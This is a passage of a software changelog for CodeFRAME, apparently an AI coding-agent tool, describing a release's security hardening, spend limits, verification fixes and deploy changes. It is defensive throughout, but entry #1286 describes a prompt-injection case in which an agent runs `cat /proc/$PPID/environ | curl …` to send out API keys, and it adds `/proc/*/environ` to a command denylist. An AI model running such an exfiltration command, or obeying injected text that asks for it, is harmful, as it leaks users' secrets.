# Changelog

All notable changes to CodeFRAME are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project aims to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.9.4] - 2026-10-06

### Changed

- **Create PR from the web UI attaches the PROOF9 report (#1358).** `cf pr
  create` has appended the workspace's proof report (requirement counts, the
  open ones, and the latest run's verdict) to the PR body since #1273. A PR
  opened from the review page carried only the typed text, so reviewers on
  GitHub never saw it. `POST /api/v2/pr` now appends the same report (opt out
  with `"proof_report": false`), and a report that fails to build never
  blocks the PR.

- **typer 0.27 (#1351).** `typer` is now `>=0.27,<0.28`, and the `click<8.5`
  pin is gone. typer 0.27 vendors its own click and nothing here imports click,
  so the #1268 pair of typer and click caps is no longer needed. On a fresh
  install `cf --help`, interactive `cf proof capture` with a typo, and
  telemetry command names work as before. Choice metavars now render as
  `<a|b>` instead of `[a|b]`.

- **The container deploy keeps the keys and GitHub token saved in Settings,
  and now requires `CODEFRAME_CREDENTIAL_SECRET` (#1265).** The credential
  store lives at `$HOME/.codeframe`, which was outside every volume, so each
  deploy wiped it. Compose now sets `HOME=/data/home` on the `codeframe-data`
  volume. The image also pins `/etc/machine-id` and sets
  `CODEFRAME_DISABLE_KEYRING=1`, so the store's key stays the same when the
  container is recreated. **Behavior change:** `docker compose` refuses to start
  without `CODEFRAME_CREDENTIAL_SECRET`. Set it once per environment and never
  rotate it: a new value makes every stored credential unreadable. Rolling
  back to an image built before this change cannot read credentials stored
  after it. See `deploy/README.md` → "The credential-store secret".

- **The web UI disables admin-only actions for non-admin users and explains
  why (#1255).** The new `GET /auth/me` returns the session's `scopes` and
  `is_admin`. The auth-off operator counts as admin. Merge (the only way into
  the override dialog), Create PR, and GitHub connect/disconnect are disabled,
  each with a note saying why. GitHub-token Save/Remove are gated the same way;
  LLM-key Save/Remove are not, since #1303 made those per-user. A control is
  disabled only on an explicit `is_admin: false`. The server's 403 is still the
  real check. The Review sidebar also scrolls now, instead of overflowing onto
  PR History.

- **The quickstart's first run executes one task, and its PROVE step reaches
  a real pass (#1171, #1173).** The README told new users to promote every
  generated task and run `cf work batch run --all-ready`. On a cold start that
  was 25 serial agent runs and 19m37s. Step 6 is now
  `cf work start <task-id> --execute` on one promoted task. The measured
  walkthrough takes 5m59s. The full backlog run is still documented, marked
  as long-running. PROVE used to end on `cf proof run` against an empty ledger,
  which exits 2. It now shows the whole loop: capture, turn the draft stub
  into a real test, then `cf proof run --full`. `docs/QUICKSTART.md` matches.

- **`cf pr create` works as the README shows it (#1273).** It no longer needs
  `--title`: the title defaults to the branch's newest commit. The body now
  ends with the workspace's PROOF9 status (requirement counts, the open ones by
  name, the latest `cf proof run` verdict), which the README promised but which
  was never built. `--no-proof-report` turns it off. The README's SHIP step now
  names the GitHub prerequisites and the real forms `cf pr merge <number>` and
  `cf commit create -m`, and the docs test now fails when a documented example
  is missing a required argument or names a bare command group.

- **A fresh install no longer resolves an untested typer, click or openai
  (#1268).** `typer`, `click` and `openai` had floor-only pins, so `uv tool
  install codeframe-ai` resolved typer 0.27. That version vendors its own click,
  which broke `cf proof capture` prompts, `--help` metavars and telemetry
  command names, and openai resolved to 3.x against a tested 2.x. They are now
  capped at the tested versions (`typer<0.20`, `click<8.5`, `openai<3`), and the
  CLI no longer hands installed-click objects to Typer. The daily Unlocked
  Resolution check now runs the CLI suite, the TUI and validators tests, and
  the mock-provider API lifecycle against a fresh resolution.

- **Current Claude and OpenAI models now work (#1267).** Opus 4.7+, Opus 5/5.5,
  Sonnet 5/5.5 and Fable reject `temperature` and a fixed thinking budget, and
  OpenAI's gpt-5 and o-series reject `max_tokens` and `temperature`. Setting
  `CODEFRAME_*_MODEL` to any of them made every request fail with a 400. Each
  model now gets the request shape it accepts: Claude 3 and Claude 4 up to 4.6
  keep `temperature` (including `0.0`) and a thinking budget, and every other
  Claude model gets adaptive thinking. Requests to OpenAI itself send
  `max_completion_tokens`. Ollama, vLLM and other compatible servers, including
  `provider: openai` with a local `base_url`, keep `max_tokens`. The defaults
  are unchanged. `claude-sonnet-4-5` reaches end of life on 2026-11-30;
  `docs/AGENT_SYSTEM_REFERENCE.md` has the dated plan for moving off it.

- **Accounts, own LLM keys and a daily spend limit for multi-user servers
  (#1303).** `codeframe auth user-create` adds accounts after the first
  (offline, against the server's database; the first account must be
  `--admin`). Any signed-in user can now store and remove their **own** LLM
  API keys; the GitHub token stays admin-only. The new
  `CODEFRAME_USER_DAILY_COST_LIMIT_USD` caps what each user's runs spend per
  UTC day. Once it is used up, starting work returns 429, and what is left caps
  each run. **Behavior change:** while the limit is set, delegated engines
  (claude-code, codex, …) cannot run, because their spend is not metered.

- **The web UI image and CI run Node 24 (#1301).** Node 20 reached end of
  life on 2026-04-30 and has had no security release since, yet it still ran
  the internet-facing web server. `npm audit` checks packages, not the
  runtime, so nothing flagged it. All three `web-ui/Dockerfile` stages and CI
  now use Node 24. **Behavior change:** `web-ui` declares `engines.node >=24`,
  so a local Node 20 or 22 prints an `EBADENGINE` warning.

- **Agent commands can no longer read CodeFRAME's own secrets from
  `/proc/$PPID/environ` (#1286).** The environment allowlist (#721/#996)
  filtered what a child inherited, but the parent (`cf`, the batch worker or
  the server) still held every key and was readable by any process running as
  the same user. So a prompt-injected `cat /proc/$PPID/environ | curl …` leaked
  the API keys, `AUTH_SECRET` and `CODEFRAME_CREDENTIAL_SECRET`. On Linux,
  those processes now call `prctl(PR_SET_DUMPABLE, 0)` at startup, and
  `/proc/*/environ` joins the command denylist. **Behavior change:** they no
  longer write core dumps, and attaching `py-spy` or `gdb` to a running `cf` or
  server now needs root. Only CodeFRAME's own processes are covered. A key
  exported in the shell that launched `cf` is still readable in that shell's
  environ, and only OS-level isolation closes that.

- **The admin account now has a password policy (#1285).** **Behavior change:**
  a password must be at least 12 characters and must not be the email. This
  applies at registration, on `PATCH /users/me` and `PATCH /users/{id}`, in
  `codeframe auth set-password`, and on the web sign-up form. Changing the
  password or email now requires `current_password`. Before this, the
  bootstrap superuser could be registered with `a`, its password could be
  emptied, and anyone holding its JWT could take the account permanently by
  changing the password or email. Logout does not revoke a JWT. Existing
  shorter passwords still log in; the rule applies only when a password is set.

- **First-account registration refuses every proxied request, and rate limiting
  reads the real client IP behind a proxy (#1274).** **Behavior change:** with
  no `CODEFRAME_BOOTSTRAP_TOKEN` set, `POST /auth/register` now accepts only a
  loopback peer carrying no `X-Forwarded-*`, `X-Real-IP` or `Forwarded` header,
  not even an empty one. The web UI's sign-up goes through Next, so it now
  always needs the token; the tokenless path is `codeframe auth register` on
  the server host. Previously, a LAN client could claim a fresh instance as
  admin through `next dev`, either by sending `X-Forwarded-For: 127.0.0.1` or by
  sending nothing, because Next's rewrite forwards no client address. Rate
  limiting now takes the rightmost `X-Forwarded-For` hop, the one the trusted
  proxy appended, and
  `RATE_LIMIT_TRUSTED_PROXIES` defaults to loopback; set it to an empty value to
  trust nothing. The container deploy also trusts the Docker bridge. Behind
  Caddy, every client used to share one bucket, so ten bad logins locked the
  operator out.

- **The web terminal is admin-only, and hosted mode refuses execution (#1266).**
  **Behavior change:** `WS /ws/sessions/{id}/terminal` now needs a stream ticket
  minted by an `admin`-scoped principal and closes with `4403` otherwise. The
  web UI explains this instead of opening the terminal. With
  `CODEFRAME_DEPLOYMENT_MODE=hosted`, the terminal closes `4403` and task
  execute/start/resume, approve-with-`start_execution`, batch resume, gates run
  and proof run return `403`, because every process still runs as the server's
  OS user, so the per-tenant path check was never a boundary. SECURITY.md's
  trust model now says so.

- **`cf proof run` no longer exits 0 when verification was impossible (#1253).**
  **This is a behavior change that can turn a currently-green CI step red.** Two
  cases that previously exited 0 now exit **2**: every gate disabled in
  `.codeframe/proof_config.json` (`enabled_gates` excluded every obligation), and
  requirements that define no obligations at all. Both mean the command checked
  nothing while reporting success — the CLI-side twin of the `vacuous_pass` flag
  #1247 added to the API, and the same lie #1118 fixed for an empty ledger.

  Exit 2, not 1: "nothing was verified" stays distinguishable from "an obligation
  failed", so a script that retries on failure does not retry forever on a
  configuration problem. `--allow-empty` forces 0 in both new cases, as it
  already did for an empty ledger.

  **Deliberately unchanged**, because emptiness the caller asked for is not a
  vacuous pass: a scope filter that matches nothing on a doc-only change, an
  explicit `--gate` with no matching obligation, and a waived-or-satisfied
  ledger all still exit 0. If your pipeline went red on this change, the run
  found requirements it could not verify — check `enabled_gates` and that your
  requirements carry obligations.

### Removed

- **Dead code and decoys (#1305).**
  - The audit log enumerated authorization, project and user-update events,
    with three `log_*` methods, that nothing emits. That read as audit coverage
    that did not exist, so they are gone, and the module lists only what is
    logged.
  - Also removed because nothing called them: `MetricsTracker`'s
    agent/stats/timeseries queries, the repository base's async helpers,
    `Database.close_all` and `get_scope_permissions`.
  - The web UI's `buildCsp` now **requires** a nonce instead of falling back to
    `script-src 'unsafe-inline'`, a branch only tests reached.
  - A `costs_v2` TODO that pointed at a deleted module, and which would have
    re-created #943 if followed, now gives the real reason for its raw
    connection.

- **Scripts that reported success without doing the work, and one operator's
  laptop, are out of the public repo (#969).** `scripts/deploy.sh` printed
  "Deployment simulation successful" and exited 0 without deploying — wired into a
  pipeline it was a green step and no deployment. `seed-staging.sh` faked the same
  against the v1 `/api/projects` that no longer exists. `install-systemd-service.sh`
  installed `codeframe-staging.service`, a unit deleted months earlier, so it could
  only ever abort. All three are gone, along with `fix_workspace_env.py`,
  `test-websocket.py` (personal LAN host, removed `/ws` route),
  `start-staging-windows.ps1` and `WINDOWS_AUTOSTART_SETUP.md` (WSL staging that
  the container rebuild replaced), and `tests/test_issues.md`.
  `test-results/.last-run.json` was tracked in defiance of its own `.gitignore`
  entry and permanently reported `"status": "failed"`; it is untracked.
  `claudedocs/` (38 dated session-scratch files) moved to `legacydocs/claudedocs/`
  and the root `demo-*.md` walkthroughs to `legacydocs/demos/`.

### Fixed

- **A lapsed waiver shows as expired, not waived (#1360).** Since #1276 the
  merge gate blocks on a WAIVED requirement whose waiver has expired. The
  `/proof` page, the dashboard widget and `GET /api/v2/proof/status` still
  counted it as waived, so a user could see "0 open" and have a merge refused
  for that very requirement. They now count it as `waiver_expired` and badge
  it "waiver expired". The check is read-only and uses the gate's own
  predicate. `cf proof status` already reverted such waivers to open.

- **The daily spend limit now counts THINK-stage and chat spend (#1345).**
  #1303 limited task and batch runs only, and only ReactAgent wrote to the
  `token_usage` table the limit sums. PRD stress-test and refine, discovery,
  LLM task generation and interactive session chat spent tokens the limit
  never saw. Each now records its usage (`call_type` `planning` or
  `session_chat`), refuses with 429 `SPEND_LIMIT_EXCEEDED` once the user's
  spend is used up, and reserves its share of what is left. That share is
  enforced between calls, so a recursive stress test or a tool-calling chat
  turn stops at the ceiling instead of running past it. An unpriced model's
  spend cannot be counted, so a day with unpriced usage refuses, naming
  `CODEFRAME_MODEL_PRICING`. Chat in a directory with no workspace ledger is
  refused while a limit is on.

- **Restarting a stopped worktree run says it is resuming, and `--fresh`
  discards it (#1440).** Since #1363, `cf work start <task> --execute
  --isolation worktree` silently built on the work a stopped or failed run left
  behind, uncommitted edits included, and merged it all at the end. That is
  risky when you pressed Stop because the agent was going wrong. The start now
  warns first: `Resuming a stopped or failed run on cf/<task>: N commits and M
  uncommitted files will be built on and merged back`. `--fresh` throws that
  work away and starts from the base branch. A directory in the worktree slot
  that is not that task's worktree is never deleted.

- **Interactive chat shows a provider error's actionable message, not the raw
  SDK string (#1434).** `map_provider_error` turns provider failures into typed
  errors with readable text (#1110, #1349, #1418), but the streaming path chat
  uses bypassed it: Anthropic's `async_stream` mapped nothing and OpenAI's only
  auth/rate-limit/connection, so a 413 or a retired model reached the browser
  as `Error code: 413 - {'type': 'error', ...}`. Both streaming paths now use
  the same mapping as `complete()`.

- **A chat call to an endpoint that reports no usage is billed an estimate,
  not zero (#1432).** Some OpenAI-compatible servers (local ollama/vllm, some
  proxies) ignore `include_usage`, and the adapter's counters started at 0, so
  a finished call was recorded as (0, 0): less than the same call cut off
  mid-stream, and invisible to the daily spend limit. Missing usage is now
  reported as unknown, and the chat adapter bills the same estimate it uses for
  a cut-off call (~3 chars/token). Reported usage is still billed exactly.

- **A skipped PROOF9 evidence test no longer satisfies its requirement
  (#1430).** A test named by an evidence rule that only skipped
  (`@pytest.mark.skip`, `skipif`, `pytest.skip()`, or an `xfail`, which JUnit
  reports as skipped) counted as passing, so marking the generated stub `skip`
  satisfied the requirement and unblocked the merge gate. A rule now needs at
  least one case that actually ran and passed; an all-skipped rule fails, and
  its recorded evidence says `<test>: FAILED — skipped, not run: a skip is not
  evidence` rather than a bare failure. A parametrized test with one
  passing case and one skipped case still passes.

- **A server started while `cf init` moves a legacy `state.db` waits for it
  (#1427).** The #1376 migration refuses a file a server has open, but a
  server that opened it after that check and before the move kept writing
  accounts into the copy being moved aside; the next start used `platform.db`
  without them. The server's first open of the control-plane DB now takes the
  migration's lock, and either opens first, so the migration refuses, or opens
  the published `platform.db`. Only a legacy control-plane `state.db` (one the
  migration could move) takes the lock; a workspace's own `state.db` does not,
  so a normal start pays nothing.

- **`cf engines check opencode` reports ready on one provider key or an
  opencode login (#1419).** Both `ANTHROPIC_API_KEY` and `OPENAI_API_KEY` were
  listed as requirements and every unset one counts as unmet, so opencode was
  only ever ready with both set, and never on an `opencode auth login` alone.
  Like codex (#1010) and kilo (#1353), it now checks the binary and
  `authenticated`: an opencode login or either key (env or `cf auth setup`).

- **A provider's 413, 422 or 409 is reported as a rejected request, not a
  network failure (#1418).** #1349 did this for 400 only; every other unmapped
  4xx still said "The … API call failed." with the provider's reason hidden
  behind `CODEFRAME_VERBOSE`. Any 4xx other than 401/403/404/429 now raises
  `LLMRequestRejectedError` naming its own status and quoting the provider's
  reason, and a 413 says the request is too large.

- **A chat call cut off mid tool arguments is charged for them (#1405).** A
  call interrupted before it finished reports no usage, so #1345 charges an
  estimate from the prompt plus the streamed text. Neither provider passed tool
  arguments through (Anthropic dropped `input_json_delta`, OpenAI only
  accumulated the fragments), so a call cut off while writing 3,000 characters
  of tool input was charged 1 output token. Both now emit a `tool_input_delta`
  chunk and the estimate counts it: the same call is charged ~1,000.

- **A PROOF9 evidence rule runs exactly the test it names (#1401).** Rules
  were enforced as `pytest -k <test_id>`, which is substring matching. So
  `test_unit_total` also ran `test_unit_total_wrong`, and `test_unit_req_1000`
  also ran `test_unit_req_10000`, failing a requirement on another one's test.
  Worse, a rule whose test did not exist **passed** whenever a longer-named
  test containing its name passed. The verdict now comes from a JUnit report
  of the `-k` run, counting only the cases named exactly (parametrized cases
  included); no exact case is "named test missing". It holds whatever the
  project's pytest config says: verbosity, a test path in `addopts`, and
  `-x`/`--maxfail` (overridden with `--maxfail=0`) cannot change the result.

- **The CLI and the web UI describe a repo's tech stack the same way
  (#1381).** `cf init --detect` and the web UI (workspace init, the Settings
  auto-detect toggle) had separate detectors, and the web UI's reported
  "Python with uv" for any `pyproject.toml` that mentioned `uvicorn`. The agent
  reads this text, so the same repo was described differently depending on
  where it was detected. Both now call one detector in
  `codeframe/core/tech_stack.py` (the CLI's, which reads `uv.lock`,
  `.python-version`, Node versions and package managers).

- **`cf init` works in a directory a pre-#1287 `cf serve` left behind
  (#1376).** Serving first with no `DATABASE_PATH` used to put the accounts
  and API keys in `.codeframe/state.db` with no workspace row. `cf init` there
  then failed with "contains no workspace record" until someone renamed the
  file by hand. Init now moves that control plane to `.codeframe/platform.db`
  itself. It uses SQLite's backup API, so rows still in the `-wal` come too.
  The original is kept as `state.db.pre-1287`, and init then creates the
  workspace. It never overwrites an existing `platform.db`, and it runs only
  when init would otherwise fail.

- **Deleting a workspace forgets who connected its GitHub repo (#1370).**
  `DELETE /api/v2/workspaces/{id}` left the workspace's entry in
  `~/.codeframe/github_connection_owners.json`. A later workspace at the same
  path inherited it, and background auto-close or reconciliation would have
  used the previous owner's stored PAT. That entry is now removed with the
  workspace. A refused delete (another tenant's workspace) removes nothing.

- **A stopped or failed worktree run can be started again (#1363).** A run
  with `--isolation worktree` that ends before merge-back keeps its
  `cf/<task>` branch and worktree, so the agent's work is never discarded. The
  next `cf work start` used to refuse with "a worktree or branch ... still
  exists", so pressing Start after Stop needed manual git surgery. Start now
  resumes on the preserved worktree. Committed and uncommitted work carries
  over, and merge-back lands all of it. If only the worktree directory was
  removed, the branch is reattached. A directory that is not that branch's
  worktree still refuses rather than being overwritten.

- **Security: PyJWT, urllib3 and virtualenv are on patched versions.** 24 open
  Dependabot alerts (1 critical, 12 high, 11 moderate) covered three locked
  packages:
  - PyJWT 2.13.0: key-confusion bypasses (PEM, DER, JWK and BOM accepted as
    HMAC secrets), empty-key and RecursionError DoS;
  - urllib3 2.7.0: unbounded chunk buffering, ignored proxy TLS config;
  - virtualenv 20.36.1, a pre-commit dev dependency: activation-script command
    injection and unverified seed wheels.

  The lock now has PyJWT 2.15.1, urllib3 2.8.0 and virtualenv 21.7.13. The
  security floors in `pyproject.toml` rise to `pyjwt>=2.15.0` and
  `urllib3>=2.8.0`, so an unlocked install cannot resolve a vulnerable
  version.

- **`cf engines check kilocode` tells you whether kilo can actually run
  (#1353).** It checked only the binary, so a never-logged-in kilo passed and
  then failed every task with "You need to sign in to use this model". It now
  reports `authenticated`: a kilo login, or a provider key kilo receives. It
  also listed the optional `KILOCODE_PATH` as a requirement, so kilo was never
  reported ready even when installed and logged in. That requirement is gone,
  as it went for codex in #1010.

- **A provider's 400 says the request was rejected, and why (#1349).** Any
  status without its own mapping was reported as "The … API call failed", a
  connection error, and the provider's reason appeared only with
  `CODEFRAME_VERBOSE=1`. A model rejecting a parameter therefore sent users to
  check their network. A 400 now raises `LLMRequestRejectedError`, which names
  HTTP 400, quotes the provider's own message, and points at the model or
  request rather than the network. Transport failures with no HTTP status are
  still connection errors.

- **A rejected API key's error says where that key came from (#1346).** The
  401 message guessed: "$ANTHROPIC_API_KEY, or when unset the stored key".
  For OpenAI-compatible providers it read the environment itself. It now names
  the actual source: the environment variable, the key stored for your account,
  the machine-wide stored key, or, for a hosted tenant's endpoint, that no key
  was sent. It no longer tells someone with a stored key to check an
  environment variable.

- **`cf auth rotate` on an unreadable credential store says so (#1320).** Its
  "is there anything to rotate?" check reads an undecryptable store as empty,
  so it answered "No existing credential … run setup", which hid the real error
  and its recovery steps (the store is intact, so restore the original secret).
  It now reports the unreadable store. The test that should have caught this
  passed in CI only because an earlier test leaked `ANTHROPIC_API_KEY`. It is
  now hermetic.

- **The deploy's database helper images are pinned by digest (#1390).**
  `deploy/backup-db.sh` (`python:3.12-alpine`) and the PM2 migration and
  restore steps (`alpine:3.20`, past upstream support) mount the production
  volume read-write, and ran mutable Docker Hub tags. They now use `@sha256:`
  digests, with the restore image moved to the supported `alpine:3.22`. A test fails if one
  loses its digest, and deploy/README.md explains how to refresh them, since
  Dependabot does not scan shell scripts or workflow steps.

- **Two more `role="button"` wrappers are real buttons (#1393).** A recent
  project on the workspace selector was a `div role="button"` that wrapped its
  own remove button (axe `nested-interactive`). It is now two sibling buttons.
  Proof run history made each `<tr>` a `role="button"`, which hid the table's
  row and column relationships from screen readers. The row keeps its table
  semantics, with a pressed button in its first cell. The a11y smoke spec now
  also scans the workspace selector and a proof page with run history.

- **The ruff gate no longer fails clean code over a config written for a
  newer ruff (#1308).** When a project has no ruff of its own, CodeFRAME's
  copy lints it against the project's config. If that config uses options
  newer than CodeFRAME's ruff ("unknown field", an unknown rule or value), the
  gate, per-edit lint and autofix now report **SKIPPED** with an explanation,
  instead of FAILED. A config that is simply broken, or the project's own ruff
  rejecting its own config, still fails. Per-edit lint also stops forcing
  `--output-format=concise`, which ruff < 0.3 rejects with a usage error on
  every edit.

- **A batch of low-severity correctness fixes (#1306).**
  - `cf checkpoint restore` no longer revives MERGED tasks or rewinds a task
    whose run is still in progress. It reports how many tasks it actually
    changed and which it left alone, rather than the snapshot's size.
  - The batch supervisor caches its decisions per workspace, and matches
    topics by whole word: "pip" no longer matches "pipeline", and a question
    is no longer keyed by its first 50 characters. Before, one workspace's
    decision could auto-answer an unrelated blocker in another.
  - `cf proof waive` records the OS user as the approver, as
    `pr merge --override` does, instead of the constant `cli-user`.
  - The opencode adapter always sends the prompt on stdin. In argv, `ps`
    showed it to every user on the machine, the same leak #955 closed for
    kilocode.
  - The execution page reports the real run time instead of "complete in 0s".
  - `gitpython` is now `>=3.1.60,<4`. 3.1.59's Actor ReDoS was reachable
    through `/api/v2/git/commits`.

- **Docs and deploy config match what ships (#1304).**
  - `docs/GOLDEN_PATH.md`, which CLAUDE.md tells agents to read first, listed
    an `IN_REVIEW` state and PR-driven task transitions that were never built,
    and a status checklist claiming `prd generate`, the PR commands and
    `cf auth` were missing. The state machine section now mirrors
    `ALLOWED_TRANSITIONS`, and a test keeps the two equal. The checklist is
    replaced by a pointer to the roadmap's Summary table.
  - The production ports in `.env.production.example` and the Caddyfile
    comment now match the compose defaults (14300/14400, not 3000/8000).
  - `scripts/remote-setup.sh` installs Docker instead of PM2 and Node, and
    names the compose deploy instead of a missing `deploy-staging.sh`.
  - README: `cf checkpoint restore` restores task statuses, not files, and
    `cf work diagnose` is pattern-based.
  - A superseded legacy doc that carried the VPS's public IP is removed, and a
    test fails on any routable IPv4 in tracked docs or deploy config.

- **Concurrent `cf proof capture` runs no longer overwrite each other
  (#1399).** Capture read the next `REQ-####` id and saved the row later, on a
  separate connection with `INSERT OR REPLACE`. Two captures at once took the
  same id, so the second silently replaced the first and both shared one stub
  directory: six parallel captures left five requirements. The id is now
  reserved and the row inserted in one `BEGIN IMMEDIATE` transaction, through
  #923's `allocate_requirement`, which had no callers. Stubs are still written
  before the row commits, so a failed write takes no id.

- **A rejected LLM key is reported as one on the PRD and discovery routes (#1328).**
  Refine, discovery start, answer and PRD/task generation returned an opaque 500
  "internal error" when the provider rejected the key. They now return
  **502 `UPSTREAM_AUTH_FAILED`** with the message that says which key was read
  and how to fix it (never 401, which the web UI treats as an expired session).
  A provider rate limit is **429 `RATE_LIMITED`** and an overloaded provider is
  503. The stress-test stream's error event carries the same code. An
  unexpected stream failure no longer sends its internal exception text: the
  client gets a correlation id, as other routes already do.

- **Interactive-session cost is priced correctly, and unknown when it cannot be
  (#1299).** Sessions on the web UI's default model, `claude-sonnet-4-6`, were
  recorded at $0.00, and Opus 4.5 and Haiku 4.5 turns were mispriced, because
  sessions kept their own stale price table. They now use the same
  `MODEL_PRICING` as everything else, `CODEFRAME_MODEL_PRICING` included. A
  session on a model with no price shows "Cost unknown" rather than $0.

- **A requirement's proof checks only its own tests (#1397).** Same-title
  requirements also shared their test *function* names, and `cf proof run`
  selects tests by name, so a re-captured glitch whose regression was not fixed
  yet failed the requirement already satisfied, and the merge gate blocked on
  both. New requirements name their tests by id as well as title
  (`test_unit_req_0002_total_wrong`). Requirements captured earlier keep the
  names they have.

- **Two PROOF9 requirements with the same title can both be satisfied (#1372).**
  Capturing a recurring glitch again under its old title, the normal LOOP
  step, wrote stub files with the same name into both requirements' folders.
  pytest then refused to collect either, so every obligation of **both**
  requirements failed however the stubs were implemented. Stub files now carry
  the requirement id (`test_req_0002_total_wrong_unit.py`). Requirements
  captured before this release keep their old file names. If two of them share
  a title, rename one of the two files by hand, keeping the `test_` function
  inside it as it is.

- **`cf work replay` works on real runs (#1300).** The built-in react engine now
  records an execution trace on every run. Before, no production path recorded
  one, so `cf work replay`, `diff`, `export-trace` and `rerun` always answered
  "No trace found". A run that is resumed after a blocker, or retried after a
  stall, continues its step numbering instead of mixing two attempts together.

- **Web UI accessibility baseline, enforced in CI (#1298).** An axe-core pass
  (WCAG 2.1 AA) over the ten core pages at laptop and phone width now runs with
  the PR smoke suite and fails on serious or critical violations. It started at
  138 failing elements. The fixes:
  - **Names:** sidebar links keep their names below 1024px, and the discovery
    Send button and the execution progress bar are named.
  - **Task card:** opens from a real button, so screen readers reach its Execute
    and Stop actions.
  - **Live regions:** the stress test announces its progress and failures.
  - **PRD editor:** its tabs point at real tab panels.
  - **Contrast:** muted text, destructive red and diff colours meet AA.
  - **Costs:** its scrolling chart and table can be scrolled from the keyboard.

- **Web UI: confirmations, visible failures, and pages that fit the screen (#1297).**
  - Removing an API key, disconnecting GitHub, and Stop on a task card now ask
    first. Each one used to delete a credential or stop a running agent on a
    single click.
  - A failed PRD save, workspace init, tech-stack save or Stop now shows an
    error; each used to fail silently. Initialize Workspace shows its progress.
  - The task board's six columns no longer overlap at 1280 to 1440px; it scrolls
    sideways instead. At phone width the execution page no longer overflows, so
    its Stop button stays on screen.

- **A self-hosted web UI streams, and a local one runs out of the box (#1296).**
  - The task and stress-test streams now find the backend from
    `NEXT_PUBLIC_API_URL` when `NEXT_PUBLIC_SSE_URL` is not set. They used to
    dial `localhost:8000`, so a deploy that followed the docs had dead streams.
  - The Content-Security-Policy allows the origins the streams and sockets
    actually dial, including in the container image. There it used to fall
    back to a loopback default whatever the image was built for.
  - The web UI's defaults point at `codeframe serve`'s port, 8080, not 8000,
    so signing in from `npm run dev` works with nothing configured.
  - `docs/QUICKSTART.md` documents `WORKSPACE_ROOT`, without which the server
    refuses to start, and how to run the web UI locally. `.env.example`
    gains `WORKSPACE_ROOT`.

- **Container deploys back up the real database and can create their first account (#1295).**
  - Every deploy, staging included, now takes an online SQLite backup of the
    live `/data/codeframe.db` (`deploy/backup-db.sh`). The old step copied a
    path that does not exist on a container host, skipped it silently and
    reported success. Once a host has had a database, a deploy that finds the
    database or its volume gone fails instead of carrying on.
  - The deploy keeps an optional `CODEFRAME_BOOTSTRAP_TOKEN` secret. It used to
    erase the token from the env file it regenerates.
  - deploy/README.md registers the first account inside the backend container.
    From the host it was always refused, because there the request arrives
    from the Docker bridge, not loopback. The README also documents restoring
    a backup.

- **Large workspaces no longer lose tasks, blockers or events past a list limit (#1294).**
  - `cf tasks generate --overwrite` removes every old task. Past 100 tasks the
    rest survived, and `cf work batch run --all-ready` would run them.
  - The TUI dashboard, `cf blocker list` and dependent-task lookups see more
    than 100 rows; `cf schedule` and `cf checkpoint create` see more than 1000.
    A checkpoint used to drop the rest, so restoring it could not bring them back.
  - `cf work batch follow` and `cf events tail` no longer skip events when
    more than 50 arrive between polls, so a batch's final event is not missed.
    `GET /api/v2/events?since_id=N` now returns the events right after `N`
    rather than the newest ones.

- **THINK-stage output fails loudly instead of corrupting your plan (#1293).**
  - **`cf tasks generate --recursive`:** an unclear answer from the model now
    stops with an error. It used to produce placeholder tasks such as
    "Part 1 of: <whole PRD>".
  - **`cf prd stress-test` refine:** a rewrite cut off at the model's token
    limit is no longer saved as a new PRD version. A reply wrapped in a code
    fence is rejected too: the original PRD is kept and a warning is logged,
    so re-run the refine. A PRD that is itself shaped like that is saved as
    returned.
  - **Task dependencies:** a generated task that depends on itself no longer
    crashes generation halfway through, and a dependency cycle is broken with
    a warning instead of being saved, where it used to break `cf schedule`
    later.
  - **Valid task JSON:** a reply with prose or a code fence around the array is
    no longer misreported as truncated.
  - **`cf import ralph`:** an item checked off in `fix_plan.md` since the last
    import is now marked DONE.

- **Every Settings control now does something (#1292).**
  - **Workspace → default branch:** it is now the base for a PR created
    without one, from the web UI or `cf pr create`.
  - **Workspace → tech-stack auto-detect and override:** they now set the
    workspace's tech stack, which the agent reads.
  - **Agent → "default model per agent type":** removed. No engine ever read
    it. An existing `config.yaml` that still has it keeps loading, and the key
    is ignored.

- **The session terminal runs what you type (#1291).** The terminal on
  `/sessions/[id]` connected but never ran a command: bash ran on pipes, so it
  never treated the web terminal's Enter (`\r`) as end of line. The shell now
  runs on a PTY as its controlling terminal (via util-linux `setsid --ctty`),
  so Enter, Ctrl+C and window resizes work. Closing a terminal also no longer
  leaks the user's slot; three leaks used to lock that user out until the
  server restarted. A shell that exits now closes its terminal even with a
  background job still running.

- **CLI output shows text from files, GitHub and the LLM as written (#1290).**
  Text in square brackets, such as `[/login]`, `list[str]` or `arr[i]`, was
  read as Rich markup.
  - **Crashes:** `cf import ralph` crashed after the import was already
    written, `cf prd stress-test` crashed before saving its `--output` file
    (which is now written first), and `cf tasks generate` crashed after saving
    the tasks.
  - **Dropped or mangled text:** `cf prd diff`, `cf work diff`,
    `cf work batch run`, `cf prd versions` and the `cf pr` commands dropped or
    mangled bracketed text.
  - **Invalid JSON:** `cf engines stats --format json` printed through Rich,
    so it was not valid JSON when lines were long, when the data contained
    brackets, or when `FORCE_COLOR` was set.
  - **PRD diffs:** they put their `---`/`+++` headers on one line and merged a
    changed last line into the next. This also affected the API, which
    returns the same diff.

- **`RATE_LIMIT_STORAGE=redis` works (#1289).** It is the documented setting
  for multi-worker servers, but the redis client was not a dependency, and
  `codeframe serve` crashed at import with a raw `limits` traceback. Install the
  new extra, `codeframe-ai[redis]`. Without it the server refuses to start with
  a message naming the extra, and a malformed `REDIS_URL` is reported as one.
  It deliberately does not fall back to in-memory counters, which would
  multiply every limit, auth brute-force protection included, by the worker
  count. For the same reason, `RATE_LIMIT_STORAGE=redis` without `REDIS_URL`
  now refuses to start instead of quietly using memory.

- **Webhooks fired by the CLI are delivered (#1288).** `batch.completed` at
  the end of `cf work batch run`, and `blocker.created` raised in a batch-task
  subprocess, were sent on a daemon thread that died when the process exited,
  so the POST never left. The Settings page's **Test** button waits for its
  send, which is why it never showed the problem. The send now runs on a
  non-daemon thread, and the process waits for it at exit: up to the webhook
  timeout (5s) to resolve the host plus 5s to send. Host lookup no longer uses
  the executor that interpreter shutdown closes first, so a late send is not
  refused, and a hung DNS lookup cannot stretch the wait past the timeout.
  Sends scheduled from the server are also held until they finish.

- **`cf serve` no longer breaks the workspace it runs in (#1287).** Without
  `DATABASE_PATH`, the server kept its accounts and API keys in
  `.codeframe/state.db`, which is the workspace's own database. Serving before
  `cf init` made init fail with "Workspace database exists but contains no
